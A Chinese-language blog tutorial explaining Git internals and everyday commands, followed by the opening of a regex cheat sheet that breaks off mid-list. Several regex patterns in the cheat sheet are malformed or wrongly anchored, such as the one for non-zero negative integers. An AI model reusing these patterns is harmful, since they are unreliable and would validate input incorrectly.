GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。   Git原理 详细图文解释可参考此篇文章使用原理视角看Git，里面详细用图文解释了git的版本控制原理\ngit的工作流程大概如下：\n 克隆 Git 资源作为工作目录。 在克隆的资源上添加或修改文件。 如果其他人修改了，你可以更新资源。 在提交前查看修改。 提交修改。 在修改完成后，如果发现错误，可以撤回提交并再次修改并提交。  基本概念 我们先来理解下Git 工作区、暂存区和版本库概念\n  工作区：就是你项目的目录（可见目录）。\n  缓存区：英文叫stage, 或index。一般存放在”git目录”下的index文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）。\n  版本库：工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。\n  下面这个图展示了工作区、版本库中的暂存区和版本库之间的关系：\n如果我们要对项目进行管理，就切换到该项目目录底下，使用git init命令，进行初始化\n1  $git init   git init 命令只会做一件事，就是在项目的根目录下创建一个 .git 的子目录，用来保存当前项目的一些版本信息，我们可以继续使用 tree -a 命令查看该目录的完整结构，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  $tree -a . └── .git ├── HEAD ├── branches ├── config ├── description ├── hooks │ ├── applypatch-msg.sample │ ├── commit-msg.sample │ ├── fsmonitor-watchman.sample │ ├── post-update.sample │ ├── pre-applypatch.sample │ ├── pre-commit.sample │ ├── pre-push.sample │ ├── pre-rebase.sample │ ├── pre-receive.sample │ ├── prepare-commit-msg.sample │ └── update.sample ├── index ├── info │ └── exclude ├── objects │ ├── .DS_Store │ ├── info │ └── pack └── refs ├── heads └── tags   Git目录解析 config 目录 config 是仓库的配置文件，一个典型的配置文件如下，我们创建的远端，分支都在等信息都在配置文件里有表现；fetch 操作的行为也是在这里配置的：\n[core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true [remote \"origin\"] url = git@github.com:yanhaijing/zepto.fullpage.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \"master\"] remote = origin merge = refs/heads/master [branch \"dev\"] remote = origin merge = refs/heads/dev objects 目录 Git 可以通过一种算法可以得到任意文件的 “指纹”（40 位 16 进制数字），然后通过文件指纹存取数据，存取的数据都位于 objects 目录。\n例如我们可以手动创建一个测试文本文件并使用 git add . 命令来观察 .git 文件夹出现的变化：\n1 2  $ touch test.txt $ git add .   git add . 命令就是用于把当前新增的变化添加进 Git 本地仓库的，在我们使用后，我们惊奇的发现 .git 目录下的 objects/ 目录下多了一个目录：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  $ tree -a . ├── .git │ ├── HEAD │ ├── branches │ ├── config │ ├── description │ ├── hooks │ │ ├── 节省篇幅..省略.. │ ├── index │ ├── info │ │ └── exclude │ ├── objects │ │ ├── .DS_Store │ │ ├── e6 │ │ │ └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391 │ │ ├── info │ │ └── pack │ └── refs │ ├── heads │ └── tags └── test.txt   我们可以使用 git hash-object test.txt 命令来看看刚才我们创建的 test.txt 的 “文件指纹”：\n1 2  $ git hash-object test.txt e69de29bb2d1d6434b8b29ae775ad8c2e48c5391   这时候我们可以发现，新创建的目录 e6 其实是该文件哈希值的前两位，这其实是 Git 做的一层类似于索引一样的东西，并且默认采用 16 进制的两位数来当索引，是非常合适的。\n这边其实引入了Sha-1算法\nSHA-1将文件中的内容通过通过计算生成一个 40 位长度的hash值。\nSha-1的非常有特点：\n 由文件内容计算出的hash值 hash值相同，文件内容相同  对于添加的内容，无论我们执行多少次，都会得到相同的结果。因此，文件的sha-1值是可以作为文件的唯一 id 。同时，它还有一个额外的功能，校验文件完整性。\nobjects 目录下有 3 种类型的数据：\n Blob； Tree; Commit；  文件都被存储为 blob 类型的文件，文件夹被存储为 tree 类型的文件，创建的提交节点被存储为 Commit 类型的数据；\n一般我们系统中的目录(tree)，在 Git 会像下面这样存储：\n而 Commit 类型的数据则整合了 tree 和 blob 类型，保存了当前的所有变化，例如我们可以再在刚才的目录下新建一个目录，并添加一些文件试试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  $ mkdir test $ touch test/test.file $ tree -a . ├── .git │ ├── HEAD │ ├── branches │ ├── config │ ├── description │ ├── hooks │ │ ├── 节省篇幅..省略.. │ ├── index │ ├── info │ │ └── exclude │ ├── objects │ │ ├── .DS_Store │ │ ├── e6 │ │ │ └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391 │ │ ├── info │ │ └── pack │ └── refs │ ├── heads │ └── tags ├── test │ └── test.file └── test.txt   提交完Commit在观察变化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  $ git commit -a -m \"test: 新增测试文件夹和测试文件观察.git文件的变化\" [master (root-commit) 30d51b1] test: 新增测试文件夹和测试文件观察.git文件的变化 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 test.txt $ tree -a . ├── .git │ ├── COMMIT_EDITMSG │ ├── HEAD │ ├── branches │ ├── config │ ├── description │ ├── hooks │ │ ├── ...省略... │ ├── index │ ├── info │ │ └── exclude │ ├── logs │ │ ├── HEAD │ │ └── refs │ │ └── heads │ │ └── master │ ├── objects │ │ ├── .DS_Store │ │ ├── 30 │ │ │ └── d51b1edd2efd551dd6bd52d4520487b5708c0e │ │ ├── 5e │ │ │ └── fb9bc29c482e023e40e0a2b3b7e49cec842034 │ │ ├── e6 │ │ │ └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391 │ │ ├── info │ │ └── pack │ └── refs │ ├── heads │ │ └── master │ └── tags ├── test │ └── test.file └── test.txt   首先我们可以观察到我们提交了一个 Commit 的时候在第一句话里面返回了一个短的像是哈希值一样的东西： [master (root-commit) 30d51b1] 中 的 30d51b1，对应的我们也可以在 objects 找到刚才 commit 的对象，我们可以使用 git cat-file -p 命令输出一下当前文件的内容：\n1 2 3 4 5 6 7  $ git cat-file -p 30d5 tree 5efb9bc29c482e023e40e0a2b3b7e49cec842034 author 我没有三颗心脏 1565742122 +0800 committer 我没有三颗心脏 1565742122 +0800 test: 新增测试文件夹和测试文件观察.git文件的变化   我们发现这里面有提交的内容信息、作者信息、提交者信息以及 commit message，当然我们可以进一步看到提交的内容具体有哪些：\n1 2  $ git cat-file -p 5efb 100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 test.txt   我们再试着提交一个 commit 来观察变化:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  $ touch test/test2.file $ git commit -a -m \"test: 新增加一个 commit 以观察变化.\" [master 9dfabac] test: 新增加一个 commit 以观察变化. 2 files changed, 0 insertions(+), 0 deletions(-) create mode 100644 test/test.file create mode 100644 test/test2.file $ git cat-file -p 9dfabac tree c562bfb9441352f4c218b0028148289f1ea7d7cd parent 30d51b1edd2efd551dd6bd52d4520487b5708c0e author 龙滔 1565878699 +0800 committer 龙滔 1565878699 +0800 test: 新增加一个 commit 以观察变化.   可以观察到这一次的 commit 多了一个 parent 的行，其中的 “指纹” 和上一次的 commit 一模一样，当我们提交两个 commit 之后我们的 Git 仓库可以简化为下图：\n 说明：其中因为我们 test 文件夹新增了文件，也就是出现了变化，所以就被标识成了新的 tree 类型的对象；  refs 目录 refs 目录存储都是引用文件，如本地分支，远端分支，标签等\n refs/heads/xxx 本地分支 refs/remotes/origin/xxx 远端分支 refs/tags/xxx 本地tag  引用文件的内容都是 40 位长度的 commit\n1 2  $ cat .git/refs/heads/master 9dfabac68470a588a4b4a78742249df46438874a   这就像是一个指针一样，它指向了你的最后一次提交（例如这里就指向了第二次提交的 commit），我们补充上分支信息，现在的 Git 仓库就会像下图所示：\nHEAD 目录 HEAD 目录下存储的是当前所在的位置，其内容是分支的名称：\n1 2  $ cat HEAD ref: refs/heads/master   我们再补充上 HEAD 的信息，现在的 Git 仓库如下图所示：\ngit的冲突处理 以下主要参考以下两篇文章\n git冲突处理图解\n使用原理视角看 Git\n 讲完git的目录结构，我们可知道分支在git中仅是一个指针，但是在分布式工作中，无可避免的会遇见冲突（分支的合并）\n图上的情况，并不是移动分支指针就能够解决问题的，它需要一种合并策略。首先我们需要明确的是谁与谁的合并，是 2，3 与 4， 5， 6 两条线的合并吗？其实并不是的，真实合并的其实只有 3 和 6，因为每一次的提交都包含了项目完整的快照，即合并只是 tree 与 tree 的合并。\n这可能说起来有点绕，我们可以先来想一个简单的算法，用来比较 3 和 6 的不同。如果我们只是单纯的比较 3 和 6 的信息，其实并没有意义，因为它们之间并不能确切的表达出当前的冲突状态。因此我们需要选取它们两个分支的分歧点（merge base）作为参考点，进行比较。\n首先我们把 1 作为基础，然后把 1、3、6 中所有的文件做一个列表，然后依次遍历这个列表中的文件。我们现在拿列表中的一个文件进行举例，把在提交在 1、3、6 中的该文件分别称为版本1、版本3、版本6，可能出现如下几种情况：\n**1. 版本 1、版本 3、版本 6 的 “指纹” 值都相同：**这种情况则说明没有冲突； **2. 版本 3 or 版本 6 至少有一个与版本 1 状态相同（指的是指纹值相同或都不存在）：**这种情况可以自动合并，比如版本 1 中存在一个文件，在版本 3 中没有对该文件进行修改，而版本 6 中删除了这个文件，则以版本 6 为准就可以了； **3. 版本 3 or 版本 6 都与版本 1 的状态不同：**这种情况复杂一些，自动合并策略很难生效了，所以需要手动解决；\nmerge 操作 在解决完冲突后，我们可以将修改的内容提交为一个新的提交，这就是 merge。\n可以看到 merge 是一种不修改分支历史提交记录的方式，这也是我们常用的方式。但是这种方式在某些情况下使用起来不太方便，比如我们创建了一些提交发送给管理者，管理者在合并操作中产生了冲突，还需要去解决冲突，这无疑增加了他人的负担。\n而我们使用 rebase 可以解决这种问题。\nrebase 操作 假设我们的分支结构如下：\nrebase 会把从 Merge Base 以来的所有提交，以补丁的形式一个一个重新打到目标分支上。这使得目标分支合并该分支的时候会直接 Fast Forward（可以简单理解为直接后移指针），即不会产生任何冲突。提交历史是一条线，这对强迫症患者可谓是一大福音。\n其实 rebase 主要是在 .git/rebase-merge 下生成了两个文件，分别为 git-rebase-todo 和 done 文件，这两个文件的作用光看名字就大概能够看得出来。git-rebase-todo 中存放了 rebase 将要操作的 commit，而 done 存放正操作或已操作完毕的 commit，比如我们这里，git-rebase-todo 存放了 4、5、6 三个提交。\n首先 Git 会把 4 这个 commit 放入 done，表示正在操作 4，然后将 4 以补丁的方式打到 3 上，形成了新的 4`，这一步是可能产生冲突的，如果有冲突，需要解决冲突之后才能继续操作。\n接着按同样的方式把 5、6 都放入 done，最后把指针移动到最新的提交 6 上，就完成了 rebase 的操作。\n**从刚才的图中，我们就可以看到 rebase 的一个缺点，那就是修改了分支的历史提交。**如果已经将分支推送到了远程仓库，会导致无法将修改后的分支推送上去，必须使用 -f 参数（force）强行推送。\n所以使用 rebase 最好不要在公共分支上进行操作。\nSquash and Merge 操作 简单说就是压缩提交，把多次的提交融合到一个 commit 中，这样的好处不言而喻，我们着重来讨论一下实现的技术细节，还是以我们上面最开始的分支情况为例，首先，Git 会创建一个临时分支，指向当前 feature 的最新 commit。\n然后按照上面 rebase 的方式，变基到 master 的最新 commit 处。\n接着用 rebase 来 squash 之，压缩这些提交为一个提交。\n最后以 fast forward 的方式合并到 master 中。\n可见此时 master 分支多且只多了一个描述了这次改动的提交，这对于大型工程，保持主分支的简洁易懂有很大的帮助。\ngit基本操作 git配置 Git 提供了一个叫做 git config 的工具，专门用来配置或读取相应的工作环境变量。 这些环境变量，决定了 Git 在各个环节的具体工作方式和行为。这些变量可以存放在以下三个不同的地方：\n /etc/gitconfig 文件：系统中对所有用户都普遍适用的配置。若使用 git config 时用 –system 选项，读写的就是这个文件。 ~/.gitconfig 文件：用户目录下的配置文件只适用于该用户。若使用 git config 时用 –global 选项，读写的就是这个文件。 当前项目的 Git 目录中的配置文件（也就是工作目录中的 .git/config 文件）：这里的配置仅仅针对当前项目有效。每一个级别的配置都会覆盖上层的相同配置，所以 .git/config 里的配置会覆盖 /etc/gitconfig 中的同名变量。\n在 Windows 系统上，Git 会找寻用户主目录下的 .gitconfig 文件。主目录即 $HOME 变量指定的目录，一般都是 C:\\Documents and Settings$USER。\n此外，Git 还会尝试找寻 /etc/gitconfig 文件，只不过看当初 Git 装在什么目录，就以此作为根目录来定位。\n 1.用户信息\tgit config user 在使用git提交前，一定要配置提交者个人的用户名称和电子邮件\n1 2  $ git config --global user.name \"wyndam\" $ git config --global user.email \"only.night@qq.com\"   如果用了*--global*选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。 如果要在某个特定的项目中使用其他名字或者电邮，只要去掉*–global*选项重新配置即可，新的设定保存在当前项目的 .git/config 文件里。\n2.文本编辑器 设置Git默认使用的文本编辑器, 一般可能会是 Vi 或者 Vim。如果你有其他偏好，比如 Emacs 的话，可以重新设置：\n1  $ git config --global core.editor emacs   3.差异分析工具 还有一个比较常用的是，在解决合并冲突时使用哪种差异分析工具。比如要改用 vimdiff 的话：\n1  $ git config --global merge.tool vimdiff   Git 可以理解 kdiff3，tkdiff，meld，xxdiff，emerge，vimdiff，gvimdiff，ecmerge，和 opendiff 等合并工具的输出信息。 当然，你也可以指定使用自己开发的工具。\n4.查看配置信息\tgit config --list 要检查已有的配置信息，可以使用 git config –list 命令：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  $ git config --list core.symlinks=false core.autocrlf=true color.diff=auto color.status=auto color.branch=auto color.interactive=true pack.packsizelimit=2g help.format=html http.sslcainfo=E:/Platform/Git/mingw32/ssl/certs/ca-bundle.crt diff.astextplain.textconv=astextplain rebase.autosquash=true filter.lfs.clean=git-lfs clean %f filter.lfs.smudge=git-lfs smudge %f filter.lfs.required=true user.name=Wyndam user.email=only.night@qq.com core.editor=subl   有时候会看到重复的变量名，那就说明它们来自不同的配置文件（比如 /etc/gitconfig 和 ~/.gitconfig），不过最终 Git 实际采用的是最后一个。 这些配置我们也可以在 ~/.gitconfig 或 /etc/gitconfig 看到，如下所示：\n[filter \"lfs\"] clean = git-lfs clean %f smudge = git-lfs smudge %f required = true [user] name = Wyndam email = only.night@qq.com [core] editor = subl 也可以直接查阅某个环境变量的设定，只要把特定的名字跟在后面即可，像这样：\n1 2 3  $ git config user.email magic@outlook.com   新建git本地仓库 Git 使用 git init 命令来初始化一个 Git 仓库，Git 的很多命令都需要在 Git 的仓库中运行，所以 git init 是使用 Git 的第一个命令。 在执行完成 git init 命令后，Git 仓库会生成一个 .git 目录，该目录包含了资源的所有元数据，其他的项目目录保持不变（不像 SVN 会在每个子目录生成 .svn 目录，Git 只在仓库的根目录生成 .git 目录）。\n在工作目录下使用命令git init\n1  $git init (path)   若没有指定path，则默认当前目录下建立git仓库。\n初始化后，会在工作目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。 如果当前目录下有几个文件想要纳入版本控制，需要先用 git add 命令告诉 Git 开始对这些文件进行跟踪，然后提交：\n1 2  $ git add . (path|file) $ git commit -m \"inital commit\"   以上命令就是把文件/文件夹提交至仓库中，若是远程仓库，还需要命令git\tpush\n复制远程仓库 git clone 我们使用 git clone 从现有 Git 仓库中拷贝项目（类似 svn checkout）。 克隆仓库的命令格式为:\n1  $ git clone \u003crepo|url\u003e (\u003cdirectory\u003e)   参数说明：\n\u003crepo|url\u003e：为Git仓库的地址url\n\u003cdirectory\u003e：为将git储存至目标目录，若为空，则默认本地目录\nGit支持ssh，git，http和https协议（此外，可以使用ftp和ftps进行获取，但这效率低下且不建议使用；请勿使用它）。\n ssh://[user@]host.xz[:port]/path/to/repo.git/ git://host.xz[:port]/path/to/repo.git/ http[s]://host.xz[:port]/path/to/repo.git/ ftp[s]://host.xz[:port]/path/to/repo.git/  也可以用类似scp的语法进行clone（实际上是ssh协议）\n [user@]host.xz:path/to/repo.git/  查看状态git\tstatus  git status 以查看在你上次提交之后是否有修改。 我演示该命令的时候加了 -s 参数，以获得简短的结果输出。如果没加该参数会详细输出内容：\n1 2 3 4 5 6 7 8 9 10  $ git status On branch master Initial commit Changes to be committed: (use \"git rm --cached \u003cfile\u003e...\" to unstage) new file: README.md   从缓存中移除文件 git reset HEAD git reset HEAD 命令用于取消已缓存的内容。 我们先改动文件 README 文件，内容如下：\n1 2 3  #README.md  ##This is readme markdown file   HelloWorld.java 文件修改为：\n1 2 3 4 5  public class HelloWorld { public static void main(String[] args) { System.out.println(\"Hello World!\"); } }   现在两个文件修改后，都提交到了缓存区，我们现在要取消其中一个的缓存，操作如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  $ git status -s M HelloWorld.java M README.md $ git add . $ git status -s M HelloWorld.java M README.md $ git reset HEAD -- HelloWorld.java Unstaged changes after reset: M HelloWorld.java $ git status -s M HelloWorld.java M README.md   现在执行 git commit，只会将 README.md 文件的改动提交，而 HelloWorld.java 是没有的。\n1 2 3 4 5  $ git commit -m \"change\" [master ad5f6fe] change 1 file changed, 1 insertion(+), 1 deletion(-) $ git status -s M HelloWorld.java   可以看到 HelloWorld.java 文件的修改并为提交。 这时我们可以使用以下命令将 HelloWorld.java 的修改提交：\n1 2 3 4 5 6 7  $ git commit -am \"修改 HelloWorld.java 文件\" [master a055c08] 修改 HelloWorld.java 文件 1 file changed, 1 insertion(+), 1 deletion(-) $ git status On branch master nothing to commit, working directory clean   简而言之，执行 git reset HEAD 以取消之前 git add 添加，但不希望包含在下一提交快照中的缓存。\n从缓存以及工作目录删除文件 git rm git rm 会将条目从缓存区中移除。这与 git reset HEAD 将条目取消缓存是有区别的。 “取消缓存”的意思就是将缓存区恢复为我们做出修改之前的样子。 默认情况下，git rm file 会将文件从缓存区和你的硬盘中（工作目录）删除。 如果你要在工作目录中留着该文件，可以使用 git rm –cached： 如我们删除 hello.java文件：(包括在本地目录下的文件，可能需要选项**-f**)\n1 2 3 4  $ git rm HelloWorld.java rm 'HelloWorld.java' $ ls README.md   不从工作区中删除文件：\n1 2 3 4  $ git rm README.md --cached rm 'README.md' $ ls README.md   修改缓存中文件名 git mv git mv 命令做得所有事情就是 git rm –cached 命令的操作， 重命名磁盘上的文件，然后再执行 git add 把新文件添加到缓存区。 我们先把刚移除的 README 添加回来：\n1 2 3 4  $ git add README.md $ git mv README.md README $ ls README    Git分支管理 几乎每一种版本控制系统都以某种形式支持分支。使用分支意味着你可以从开发主线上分离开来，然后在不影响主线的同时继续工作。 有人把 Git 的分支模型称为”必杀技特性”，而正是因为它，将 Git 从版本控制系统家族里区分出来。 创建分支命令：\n1 2 3 4 5 6 7 8 9 10 11 12  #创建分支 $ git branch [branch name] #切换分支 $ git checkout [branch name] #创建并切换分支 $ git checkout -b [branch name] #合并分支 $ git merge #删除分支 $ git branch -d [branch name]   Git分支管理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  #列出问题 $ git branch #无参数时，该命令会列出本地分支 $ git branch * master #创建分支 $ git branch testbranch $ git branch *\tbranch testbranch $ git branch testing $ git branch -D testing Deleted branch testing (was 84b13b9). #合并分支,将分支[branch name] 合并到当前分支 $ git merge [branch name] $ git merge test Updating b04e1bb..d3c2604 Fast-forward testB | 0 1 file changed, 0 insertions(+), 0 deletions(-) create mode 100644 testB   Git 查看提交历史\tgit log 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  $ git log commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -\u003e master, origin/test, test) Author: Magic \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:41:42 2019 +0800 ff commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master) Author: Magic \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:40:34 2019 +0800 fuck #可以用 --oneline 选项来查看历史记录的简洁的版本 $ git log --oneline d3c2604 (HEAD -\u003e master, origin/test, test) ff b04e1bb (origin/master) fuck #可以用 --graph 选项，查看历史中什么时候出现了分支、合并。以下为相同的命令，开启了拓扑图选项： $ git log --graph * commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -\u003e master, origin/test, test) | Author: Magic-King \u003cxxx@qq.com\u003e | Date: Sat Sep 28 23:41:42 2019 +0800 | | ff | * commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master) Author: Magic-King \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:40:34 2019 +0800 fuck #可以用 ‘--reverse’参数来逆向显示所有日志 $ git log --reverse commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master) Author: Magic-King \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:40:34 2019 +0800 fuck commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -\u003e master, origin/test, test) Author: Magic-King \u003cxxx@qq.com\u003e Date: Sat Sep 28 23:41:42 2019 +0800 ff   Git 标签 git tag 如果达到一个重要的阶段，并希望永远记住那个特别的提交快照，可以使用 git tag 给它打上标签。 比如说，我们想为我们的项目发布一个”1.0”版本。 可以用 git tag -a v1.0 命令给最新一次提交打上（HEAD）”v1.0”的标签。 -a 选项意为”创建一个带注解的标签”。 不用 -a 选项也可以执行的，但它不会记录这标签是啥时候打的，谁打的，也不会让你添加个标签的注解。 我推荐一直创建带注解的标签。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  $ git log --oneline --graph --decorate * 2b5970d (HEAD -\u003e master, tag: v1.0) Merge branch 'change_site' |\\ | * d17a0a0 (change_site) change the site * | e2714c9 新增加一行 |/ * 202199d (newtest) add test.txt file * a055c08 修改 HelloWorld.java 文件 * ad5f6fe 修改 * c2c167c 修改HelloWorld.java文件 * f9393bf third commit `` * 316fafc second commit * fdd5c53 inital commit   如果我们忘了给某个提交打标签，又将它发布了，我们可以给它追加标签。 例如，假设我们发布了提交 85fc7e7(上面实例最后一行)，但是那时候忘了给它打标签。 我们现在也可以：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  $ git tag -a v0.9 a055c08 $ git log --oneline --graph --decorate * 2b5970d (HEAD -\u003e master, tag: v1.0) Merge branch 'change_site' |\\ | * d17a0a0 (change_site) change the site * | e2714c9 新增加一行 |/ * 202199d (newtest) add test.txt file * a055c08 (tag: v0.9) 修改 HelloWorld.java 文件 * ad5f6fe 修改 * c2c167c 修改HelloWorld.java文件 * f9393bf third commit `` * 316fafc second commit * fdd5c53 inital commit   如果要查看所有标签可以使用以下命令：\n1  $ git tag   指定标签信息命令：\n1  git tag -a \u003ctagname\u003e -m \"标签\"   PGP签名标签命令：\n1  git tag -s \u003ctagname\u003e -m \"标签\"   Git 远程仓库的操作 查看当前远程库 1 2 3 4 5  $ git remote origin $ git remote -v origin git@xx.xx.xxx.xxx:/test.git (fetch) origin git@xx.xx.xxx.xxx:/test.git (push)   提取远程库 1  $ git pull   该命令就是在执行 git fetch 之后紧接着执行 git merge 远程分支到你所在的任意分支。 假设你配置好了一个远程仓库，并且你想要提取更新的数据，你可以首先执行 git fetch [alias] 告诉 Git 去获取它有你没有的数据，然后你可以执行 git merge [alias]/[branch] 以将服务器上的任何更新（假设有人这时候推送到服务器了）合并到你的当前分支。\n接下来我们在 Github 上点击”test.txt” 并在线修改它。之后我们在本地更新修改。\n1 2 3 4 5 6 7 8 9 10 11 12 13  $ git fetch origin remote: Counting objects: 3, done. remote: Compressing objects: 100% (3/3), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Unpacking objects: 100% (3/3), done. From github.com:onlynight/GitAdd 774112b..37be49b master -\u003e origin/master $ git merge origin/master Updating 774112b..37be49b Fast-forward test.txt | 1 + 1 file changed, 1 insertion(+)   推送远程库 推送你的新分支与数据到某个远端仓库命令\n1 2 3 4 5  #该命令将你的 [branch] 分支推送成为 [alias] 远程仓库上的 [branch] 分支 $ git push [alias] [branch] $ git push origin master Everything up-to-date   删除远程分支 注意：如果要删除远程分支同样也是使用push命令，在分支前加上”:”表示删除远程分支，代码如下\n1  $ git push origin :\u003cbranch name\u003e   删除本地仓库的远程仓库链接 删除远程仓库你可以使用命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  git remote rm [alias] $ git remote -v origin git@github.com:onlynight/GitAdd.git (fetch) origin git@github.com:onlynight/GitAdd.git (push) $ git remote -v origin git@github.com:onlynight/GitAdd.git (fetch) origin git@github.com:onlynight/GitAdd.git (push) origin2 git@github.com:onlnynight/GitAdd.git (fetch) origin2 git@github.com:onlnynight/GitAdd.git (push) $ git remote rm origin2 $ git remote -v origin git@github.com:onlynight/GitAdd.git (fetch) origin git@github.com:onlynight/GitAdd.git (push)   忽略特殊文件 有些时候，你必须把某些文件放到Git工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件啦，等等，每次git status都会显示Untracked files ...，有强迫症的童鞋心里肯定不爽。\n好在Git考虑到了大家的感受，这个问题解决起来也很简单，在Git工作区的根目录下创建一个特殊的.gitignore文件，然后把要忽略的文件名填进去，Git就会自动忽略这些文件。\n不需要从头写.gitignore文件，GitHub已经为我们准备了各种配置文件，只需要组合一下就可以使用了。所有配置文件可以直接在线浏览：https://github.com/github/gitignore\n忽略文件的原则是：\n 忽略操作系统自动生成的文件，比如缩略图等； 忽略编译生成的中间文件、可执行文件等，也就是如果一个文件是通过另一个文件自动生成的，那自动生成的文件就没必要放进版本库，比如Java编译产生的.class文件； 忽略你自己的带有敏感信息的配置文件，比如存放口令的配置文件。  举个例子：\n假设你在Windows下进行Python开发，Windows会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有Desktop.ini文件，因此你需要忽略Windows自动生成的垃圾文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # Windows: Thumbs.db ehthumbs.db Desktop.ini # Python: *.py[cod] *.so *.egg *.egg-info dist build # My configurations: db.ini deploy_key_rsa   最后一步就是把.gitignore也提交到Git，就完成了！当然检验.gitignore的标准是git status命令是不是说working directory clean。\n使用Windows的童鞋注意了，如果你在资源管理器里新建一个.gitignore文件，它会非常弱智地提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为.gitignore了。\n有些时候，你想添加一个文件到Git，但发现添加不了，原因是这个文件被.gitignore忽略了：\n$ git add App.class The following paths are ignored by one of your .gitignore files: App.class Use -f if you really want to add them. 如果你确实想添加该文件，可以用-f强制添加到Git：\n$ git add -f App.class 或者你发现，可能是.gitignore写得有问题，需要找出来到底哪个规则写错了，可以用git check-ignore命令检查：\n$ git check-ignore -v App.class .gitignore:3:*.class\tApp.class Git会告诉我们，.gitignore的第3行规则忽略了该文件，于是我们就可以知道应该修订哪个规则。\n 后续：搭建git服务器  ","description":"","tags":["git"],"title":"git","uri":"/posts/git/"},{"categories":["tech"],"content":"正则表达式的规则 常用元字符\n   代码 说明     . 匹配除换行符以外的任意字符   \\w 匹配字母或数字或下划线   \\s 匹配任意的空白符   \\d 匹配数字   \\b 匹配单词的开始或结束   ^ 匹配字符串的开始   $ 匹配字符串的结束    常用限定符\n   代码/语法 说明     * 重复零次或更多次   + 重复一次或更多次   ? 重复零次或一次   {n} 重复n次   {n,} 重复n次或更多次   {n,m} 重复n到m次    常用反义词\n   代码/语法 说明     \\W 匹配任意不是字母，数字，下划线，汉字的字符   \\S 匹配任意不是空白符的字符   \\D 匹配任意非数字的字符   \\B 匹配不是单词开头或结束的位置   [^x] 匹配除了x以外的任意字符   [^aeiou] 匹配除了aeiou这几个字母以外的任意字符    预定义字符集表\n   \\d \\d匹配任何十进制数，它相当于类[0-9]，\\d+如果需要匹配一位或者多位数的数字时用     \\D \\D匹配任何非数字字符，它相当于类[^0-9]   \\s \\s匹配任何空白字符，它相当于类[\\t\\n\\r\\f\\v]   \\S \\S匹配任何非空白字符，它相当于类[^\\t\\n\\r\\f\\v]   \\w \\w匹配包括下划线在内任何字母数字字符，它相当于类 {a-z,A-Z,0-9,_}   \\W \\W匹配非任何字母数字字符包括下划线在内，它相当于类 { ^a-z,A-Z,0-9,_}   \\A 仅匹配字符串开头,同^   \\Z 仅匹配字符串结尾，同$   \\b b匹配一个单词边界，也就是指单词和空格间的位置   \\B [^\\b]    常用正则表达式  引用：史上最全常用正则表达式大全\n 一、校验数字的表达式   数字：^[0-9]*$\n  n位的数字：^\\d{n}$\n  至少n位的数字：^\\d{n,}$\n  m-n位的数字：^\\d{m,n}$\n  零和非零开头的数字：^(0|[1-9][0-9]*)$\n  非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$\n  带1-2位小数的正数或负数：^(\\-)?\\d+(\\.\\d{1,2})?$\n  正数、负数、和小数：^(\\-|\\+)?\\d+(\\.\\d+)?$\n  有两位小数的正实数：^[0-9]+(.[0-9]{2})?$\n  有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$\n  非零的正整数：^[1-9]\\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\\+?[1-9][0-9]*$\n  非零的负整数：^\\-[1-9][]0-9\"*$ 或 ^-[1-9]\\d*$\n  非负整数：^\\d+$ 或 ^[1-9]\\d*|0$\n  非正整数：^-[1-9]\\d*|0$ 或 ^((-\\d+)|(0+))$\n  非负浮点数：^\\d+(\\.\\d+)?$ 或 ^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0$\n  非正浮点数：^((-\\d+(\\.\\d+)?)|(0+(\\.0+)?))$ 或 ^(-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*))|0?\\.0+|0$\n  